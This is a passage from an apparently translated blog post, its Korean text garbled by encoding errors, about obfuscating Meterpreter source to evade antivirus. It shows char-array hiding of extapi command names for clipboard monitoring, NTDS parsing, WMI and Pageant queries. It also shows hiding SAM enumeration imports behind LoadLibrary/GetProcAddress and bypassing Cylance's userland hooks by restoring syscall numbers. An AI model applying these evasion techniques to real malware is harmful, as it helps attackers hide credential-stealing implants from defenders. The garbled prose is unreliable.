class="hljs-string">&#x27;u&#x27;</span>,<span class="hljs-string">&#x27;m&#x27;</span>,<span class="hljs-number">0</span>&#125;;<span class="hljs-keyword">char</span> hid_extapi_pW25eeIGBeru[] = &#123;<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;x&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;p&#x27;</span>,<span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;s&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>,<span class="hljs-string">&#x27;v&#x27;</span>,<span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;c&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;q&#x27;</span>,<span class="hljs-string">&#x27;u&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>,<span class="hljs-string">&#x27;y&#x27;</span><span class="hljs-number">0</span>&#125;;<span class="hljs-keyword">char</span> hid_extapi_S4Ws57MYBjib[] = &#123;<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;x&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;p&#x27;</span>,<span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;s&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>,<span class="hljs-string">&#x27;v&#x27;</span>,<span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;c&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;c&#x27;</span>,<span class="hljs-string">&#x27;o&#x27;</span>,<span class="hljs-string">&#x27;n&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span><span class="hljs-string">&#x27;o&#x27;</span>,<span class="hljs-string">&#x27;l&#x27;</span>,<span class="hljs-number">0</span>&#125;;<span class="hljs-keyword">char</span> hid_extapi_HJ0lD9Dl56A4[] = &#123;<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;x&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;p&#x27;</span>,<span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;c&#x27;</span>,<span class="hljs-string">&#x27;l&#x27;</span>,<span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;p&#x27;</span>,<span class="hljs-string">&#x27;b&#x27;</span>,<span class="hljs-string">&#x27;o&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>,<span class="hljs-string">&#x27;d&#x27;</span>,<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;g&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span><span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;d&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-number">0</span>&#125;;<span class="hljs-keyword">char</span> hid_extapi_IiEzXils3UsR[] = &#123;<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;x&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;p&#x27;</span>,<span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;c&#x27;</span>,<span class="hljs-string">&#x27;l&#x27;</span>,<span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;p&#x27;</span>,<span class="hljs-string">&#x27;b&#x27;</span>,<span class="hljs-string">&#x27;o&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>,<span class="hljs-string">&#x27;d&#x27;</span>,<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;s&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span><span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;d&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-number">0</span>&#125;;<span class="hljs-keyword">char</span> hid_extapi_czLOBo0HcqCP[] = &#123;<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;x&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;p&#x27;</span>,<span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;c&#x27;</span>,<span class="hljs-string">&#x27;l&#x27;</span>,<span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;p&#x27;</span>,<span class="hljs-string">&#x27;b&#x27;</span>,<span class="hljs-string">&#x27;o&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>,<span class="hljs-string">&#x27;d&#x27;</span>,<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;m&#x27;</span>,<span class="hljs-string">&#x27;o&#x27;</span>,<span class="hljs-string">&#x27;n&#x27;</span><span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-string">&#x27;o&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>,<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;s&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-number">0</span>&#125;;<span class="hljs-keyword">char</span> hid_extapi_WcWbTrsQujiT[] = &#123;<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;x&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;p&#x27;</span>,<span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;c&#x27;</span>,<span class="hljs-string">&#x27;l&#x27;</span>,<span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;p&#x27;</span>,<span class="hljs-string">&#x27;b&#x27;</span>,<span class="hljs-string">&#x27;o&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>,<span class="hljs-string">&#x27;d&#x27;</span>,<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;m&#x27;</span>,<span class="hljs-string">&#x27;o&#x27;</span>,<span class="hljs-string">&#x27;n&#x27;</span><span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-string">&#x27;o&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>,<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;p&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;u&#x27;</span>,<span class="hljs-string">&#x27;s&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-number">0</span>&#125;;<span class="hljs-keyword">char</span> hid_extapi_rPiFTZW4ShwA[] = &#123;<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;x&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;p&#x27;</span>,<span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;c&#x27;</span>,<span class="hljs-string">&#x27;l&#x27;</span>,<span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;p&#x27;</span>,<span class="hljs-string">&#x27;b&#x27;</span>,<span class="hljs-string">&#x27;o&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>,<span class="hljs-string">&#x27;d&#x27;</span>,<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;m&#x27;</span>,<span class="hljs-string">&#x27;o&#x27;</span>,<span class="hljs-string">&#x27;n&#x27;</span><span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-string">&#x27;o&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>,<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;s&#x27;</span>,<span class="hljs-string">&#x27;u&#x27;</span>,<span class="hljs-string">&#x27;m&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-number">0</span>&#125;;<span class="hljs-keyword">char</span> hid_extapi_05fAoaZLqOoy[] = &#123;<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;x&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;p&#x27;</span>,<span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;c&#x27;</span>,<span class="hljs-string">&#x27;l&#x27;</span>,<span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;p&#x27;</span>,<span class="hljs-string">&#x27;b&#x27;</span>,<span class="hljs-string">&#x27;o&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>,<span class="hljs-string">&#x27;d&#x27;</span>,<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;m&#x27;</span>,<span class="hljs-string">&#x27;o&#x27;</span>,<span class="hljs-string">&#x27;n&#x27;</span><span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-string">&#x27;o&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>,<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;p&#x27;</span>,<span class="hljs-string">&#x27;u&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>,<span class="hljs-string">&#x27;g&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-number">0</span>&#125;;<span class="hljs-keyword">char</span> hid_extapi_cOOyHTPTvZGK[] = &#123;<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;x&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;p&#x27;</span>,<span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;c&#x27;</span>,<span class="hljs-string">&#x27;l&#x27;</span>,<span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;p&#x27;</span>,<span class="hljs-string">&#x27;b&#x27;</span>,<span class="hljs-string">&#x27;o&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>,<span class="hljs-string">&#x27;d&#x27;</span>,<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;m&#x27;</span>,<span class="hljs-string">&#x27;o&#x27;</span>,<span class="hljs-string">&#x27;n&#x27;</span>,<span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-string">&#x27;o&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>,<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;s&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-string">&#x27;o&#x27;</span>,<span class="hljs-string">&#x27;p&#x27;</span>,<span class="hljs-number">0</span>&#125;;<span class="hljs-keyword">char</span> hid_extapi_smtmvW05cI9y[] = &#123;<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;x&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;p&#x27;</span>,<span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;c&#x27;</span>,<span class="hljs-string">&#x27;l&#x27;</span>,<span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;p&#x27;</span>,<span class="hljs-string">&#x27;b&#x27;</span>,<span class="hljs-string">&#x27;o&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>,<span class="hljs-string">&#x27;d&#x27;</span>,<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;m&#x27;</span>,<span class="hljs-string">&#x27;o&#x27;</span>,<span class="hljs-string">&#x27;n&#x27;</span>,<span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-string">&#x27;o&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>,<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;d&#x27;</span>,<span class="hljs-string">&#x27;u&#x27;</span>,<span class="hljs-string">&#x27;m&#x27;</span>,<span class="hljs-string">&#x27;p&#x27;</span>,<span class="hljs-number">0</span>&#125;;<span class="hljs-keyword">char</span> hid_extapi_01kuYCM8z49k[] = &#123;<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;x&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;p&#x27;</span>,<span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;d&#x27;</span>,<span class="hljs-string">&#x27;s&#x27;</span>,<span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;d&#x27;</span>,<span class="hljs-string">&#x27;o&#x27;</span>,<span class="hljs-string">&#x27;m&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;n&#x27;</span>,<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;q&#x27;</span>,<span class="hljs-string">&#x27;u&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>,<span class="hljs-string">&#x27;y&#x27;</span>,<span class="hljs-number">0</span>&#125;;<span class="hljs-keyword">char</span> hid_extapi_SMK9uFj6nThk[] = &#123;<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;x&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;p&#x27;</span>,<span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;n&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-string">&#x27;d&#x27;</span>,<span class="hljs-string">&#x27;s&#x27;</span>,<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;p&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>,<span class="hljs-string">&#x27;s&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-number">0</span>&#125;;<span class="hljs-keyword">char</span> hid_extapi_PHxnGM7M0609[] = &#123;<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;x&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;p&#x27;</span>,<span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;w&#x27;</span>,<span class="hljs-string">&#x27;m&#x27;</span>,<span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;q&#x27;</span>,<span class="hljs-string">&#x27;u&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>,<span class="hljs-string">&#x27;y&#x27;</span>,<span class="hljs-number">0</span>&#125;;<span class="hljs-keyword">char</span> hid_extapi_J7EGS6FRHwkV[] = &#123;<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;x&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;p&#x27;</span>,<span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;p&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;g&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;n&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;s&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;n&#x27;</span>,<span class="hljs-string">&#x27;d&#x27;</span>,<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;q&#x27;</span>,<span class="hljs-string">&#x27;u&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>,<span class="hljs-string">&#x27;y&#x27;</span>,<span class="hljs-number">0</span>&#125;;Command customCommands[] =&#123;    COMMAND_REQ(hid_extapi_UQOoNXigAPq4, request_window_enum),    COMMAND_REQ(hid_extapi_vhFHmZ8u2hfz, request_service_enum),    COMMAND_REQ(hid_extapi_pW25eeIGBeru, request_service_query),    COMMAND_REQ(hid_extapi_S4Ws57MYBjib, request_service_control),    COMMAND_REQ(hid_extapi_HJ0lD9Dl56A4, request_clipboard_get_data),    COMMAND_REQ(hid_extapi_IiEzXils3UsR, request_clipboard_set_data),    COMMAND_REQ(hid_extapi_czLOBo0HcqCP, request_clipboard_monitor_start),    COMMAND_REQ(hid_extapi_WcWbTrsQujiT, request_clipboard_monitor_pause),    COMMAND_REQ(hid_extapi_rPiFTZW4ShwA, request_clipboard_monitor_resume),    COMMAND_REQ(hid_extapi_05fAoaZLqOoy, request_clipboard_monitor_purge),    COMMAND_REQ(hid_extapi_cOOyHTPTvZGK, request_clipboard_monitor_stop),    COMMAND_REQ(hid_extapi_smtmvW05cI9y, request_clipboard_monitor_dump),    COMMAND_REQ(hid_extapi_01kuYCM8z49k, request_adsi_domain_query),    COMMAND_REQ(hid_extapi_SMK9uFj6nThk, ntds_parse),    COMMAND_REQ(hid_extapi_PHxnGM7M0609, request_wmi_query),    COMMAND_REQ(hid_extapi_J7EGS6FRHwkV, request_pageant_send_query),    COMMAND_TERMINATOR&#125;;</code></pre><h2 id="API-Import-ìˆ¨ê¸°ê¸°"><a href="#API-Import-ìˆ¨ê¸°ê¸°" class="headerlink" title="API Import ìˆ¨ê¸°ê¸°"></a>API Import ìˆ¨ê¸°ê¸°</h2><p>ì™¸ë¶€ ë¼ì´ë¸ŒëŸ¬ë¦¬ì—ì„œ export ëœ í•¨ìˆ˜ë¥¼ í˜¸ì¶œí•˜ë©´ linkerê°€ <em>Import Address Table</em>(IAT)ì— ê¸°ë¡í•œë‹¤. í•¨ìˆ˜ ì´ë¦„ì€ ë°”ì´ë„ˆë¦¬ì—ì„œ í‰ë¬¸ìœ¼ë¡œ ë³¼ ìˆ˜ ìˆê³  ì‹¤í–‰í•˜ì§€ ì•Šê³  ì •ì ìœ¼ë¡œ í™•ì¸í•  ìˆ˜ ìˆë‹¤. ì˜ì‹¬ìŠ¤ëŸ¬ìš´ í•¨ìˆ˜ëª…ë“¤ì„ ìˆ¨ê¸°ê³  ì •ìƒì ì¸ ë°”ì´ë„ˆë¦¬ì— ì¡´ì¬í•˜ëŠ” ê²ƒë“¤ì€ ìœ ì§€í•˜ëŠ” ê²ƒì´ ì¢‹ë‹¤.</p><p>Meterpreterì˜ <em>kiwi</em> extensionì—ì„œ ë‹¤ìŒê³¼ ê°™ì€ ì½”ë“œë¥¼ ì°¾ì„ ìˆ˜ ìˆë‹¤.</p><pre><code class="hljs cpp">enumStatus = SamEnumerateUsersInDomain(hDomain, &amp;EnumerationContext, <span class="hljs-number">0</span>, &amp;pEnumBuffer, <span class="hljs-number">100</span>, &amp;CountRetourne</code></pre><p>ì´ í•¨ìˆ˜ëŠ” <code>samlib.dll</code>ì—ì„œ export ë˜ë¯€ë¡œ ì»´íŒŒì¼ëœ ë°”ì´ë„ˆë¦¬ì—ëŠ” <code>samlib.dll</code>ê³¼ <code>SamEnumberateUsersInDomain</code> ë¬¸ìì—´ì´ í‘œì‹œëœë‹¤.</p><p>ì´ë¥¼ í•´ê²°í•˜ê¸° ìœ„í•´ ì‹¤í–‰ ì¤‘ì— <code>LoadLibrary/GetProcAddress</code>ë¥¼ ì‚¬ìš©í•˜ì—¬ APIë¥¼ ê°€ì ¸ì˜¬ ìˆ˜ ìˆë‹¤. ì´ í•¨ìˆ˜ë“¤ì€ ë¬¸ìì—´ì„ ì¸ìë¡œ ì‚¬ìš©í•˜ë¯€ë¡œ ë‚œë…í™”ë¥¼ ì˜í•´ì•¼ í•œë‹¤. ë”°ë¼ì„œ ìœ„ì˜ ì½”ë“œë¥¼ ë‹¤ìŒê³¼ ê°™ì´ ì¬ì‘ì„±í•´ì•¼ í•œë‹¤.</p><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">NTSTATUS</span><span class="hljs-params">(__stdcall* _SamEnumerateUsersInDomain)</span><span class="hljs-params">(</span></span><span class="hljs-function"><span class="hljs-params">    SAMPR_HANDLE DomainHandle,</span></span><span class="hljs-function"><span class="hljs-params">    PDWORD EnumerationContext,</span></span><span class="hljs-function"><span class="hljs-params">    DWORD UserAccountControl,</span></span><span class="hljs-function"><span class="hljs-params">    PSAMPR_RID_ENUMERATION* Buffer,</span></span><span class="hljs-function"><span class="hljs-params">    DWORD PreferedMaximumLength,</span></span><span class="hljs-function"><span class="hljs-params">    PDWORD CountReturned</span></span><span class="hljs-function"><span class="hljs-params">)</span></span>;<span class="hljs-keyword">char</span> hid_SAMLIB_01zmejmkLCHt[] = &#123;<span class="hljs-string">&#x27;S&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;M&#x27;</span>,<span class="hljs-string">&#x27;L&#x27;</span>,<span class="hljs-string">&#x27;I&#x27;</span>,<span class="hljs-string">&#x27;B&#x27;</span>,<span class="hljs-string">&#x27;.&#x27;</span>,<span class="hljs-string">&#x27;D&#x27;</span>,<span class="hljs-string">&#x27;L&#x27;</span>,<span class="hljs-string">&#x27;L&#x27;</span>,<span class="hljs-number">0</span>&#125;;<span class="hljs-keyword">char</span> hid_SamEnu_BZxlW5ZBUAAe[] = &#123;<span class="hljs-string">&#x27;S&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;m&#x27;</span>,<span class="hljs-string">&#x27;E&#x27;</span>,<span class="hljs-string">&#x27;n&#x27;</span>,<span class="hljs-string">&#x27;u&#x27;</span>,<span class="hljs-string">&#x27;m&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;U&#x27;</span>,<span class="hljs-string">&#x27;s&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>,<span class="hljs-string">&#x27;s&#x27;</span>,<span class="hljs-string">&#x27;I&#x27;</span>,<span class="hljs-string">&#x27;n&#x27;</span>,<span class="hljs-string">&#x27;D&#x27;</span>,<span class="hljs-string">&#x27;o&#x27;</span>,<span class="hljs-string">&#x27;m&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;n&#x27;</span>,<span class="hljs-number">0</span>&#125;;HANDLE hhid_SAMLIB_BZUriyLrlgrJ = LoadLibrary(hid_SAMLIB_01zmejmkLCHt);_SamEnumerateUsersInDomain ffSamEnumerateUsersInDoma =(_SamEnumerateUsersInDomain)GetProcAddress(hhid_SAMLIB_BZUriyLrlgrJ, hid_SamEnu_BZxlW5ZBUAAe);enumStatus = ffSamEnumerateUsersInDoma(hDomain, &amp;EnumerationContext, <span class="hljs-number">0</span>, &amp;pEnumBuffer, <span class="hljs-number">100</span>, &amp;CountRetourned);</code></pre><h2 id="syscall-ì¬ì‘ì„±"><a href="#syscall-ì¬ì‘ì„±" class="headerlink" title="syscall ì¬ì‘ì„±"></a>syscall ì¬ì‘ì„±</h2><p>Cylanceê°€ ì‹¤í–‰ ì¤‘ì¸ ì»´í“¨í„°ì—ì„œ Meterpreterì˜ <em>migrate</em>ë¥¼ ì‚¬ìš©í•˜ë©´ ì•ˆí‹°ë°”ì´ëŸ¬ìŠ¤ íƒì§€ê°€ ì‹¤í–‰ëœë‹¤. CylanceëŠ” userland hookìœ¼ë¡œ í”„ë¡œì„¸ìŠ¤ ì¸ì ì…˜ì„ íƒì§€í•œë‹¤. íƒì§€ë¥¼ ìš°íšŒí•˜ë ¤ë©´ hookì„ ì œê±°í•˜ëŠ” ê²ƒìœ¼ë¡œ ê°„ë‹¨íˆ ìš°íšŒí•  ìˆ˜ ìˆë‹¤. ntdllì„ ì½ì€ í›„ syscall ë²ˆí˜¸ë¥¼ ë³µêµ¬í•˜ê³  ready-to-call shellcodeì— ì‚½ì…í•˜ëŠ” ê²ƒì€ ê°„ë‹¨í•˜ê³  userland hookì„ íš¨ê³¼ì ìœ¼ë¡œ ìš°íšŒí•œë‹¤. í•„ìëŠ” ì§€ê¸ˆê¹Œì§€ NTDLL.DLLì„ ì•…ì„± íŒŒì¼ë¡œ íŒë‹¨í•˜ëŠ” ê²ƒì„ ë³´ì§€ ëª»í–ˆë‹¤.</p><h1 id="êµ¬í˜„"><a href="#êµ¬í˜„" class="headerlink" title="êµ¬í˜„"></a>êµ¬í˜„</h1><p>ì•ì„œ ë§í•œ ëª¨ë“  ì•„ì´ë””ì–´ë“¤ì€ <em>libTooling</em>ì„ ê¸°ë°˜ìœ¼ë¡œ í•œ source code refactoring toolì—ì„œ êµ¬í˜„í•  ìˆ˜ ìˆë‹¤. ì´ ë¶€ë¶„ì€ <em>libTooling</em> ë¬¸ì„œê°€ ë¶€ì¡±í•´ì„œ í•„ìì˜ íŒ€ì—ì„œ ê°€ëŠ¥í•œ ì‹œê°„ ë™ì•ˆ í•œ ê²ƒì„ ë¬¸ì„œí™”í–ˆë‹¤. ë”°ë¼ì„œ ê°œì„ ì˜ ì—¬ì§€ê°€ ìˆìœ¼ë©° ë¬´ì–¸ê°€ ëˆˆì— ë„ëŠ” ê²½ìš° í•„ìëŠ” ê·¸ê²ƒì— ëŒ€í•´ ë“£ê³  ì‹¶ë‹¤.</p><h2 id="ì¶”ìƒ-êµ¬ë¬¸-íŠ¸ë¦¬-101"><a href="#ì¶”ìƒ-êµ¬ë¬¸-íŠ¸ë¦¬-101" class="headerlink" title="ì¶”ìƒ êµ¬ë¬¸ íŠ¸ë¦¬ 101"></a>ì¶”ìƒ êµ¬ë¬¸ íŠ¸ë¦¬ 101</h2><p>ì»´íŒŒì¼ëŸ¬ëŠ” ë³´í†µ ì—¬ëŸ¬ êµ¬ì„± ìš”ì†Œë¡œ êµ¬ì„±ë˜ëŠ”ë° ì¼ë°˜ì ìœ¼ë¡œ <em>Parser</em>ì™€ <em>Lexer</em>ë¡œ êµ¬ì„±ëœë‹¤. ì†ŒìŠ¤ ì½”ë“œê°€ ì»´íŒŒì¼ëŸ¬ì— ë“¤ì–´ê°€ë©´ 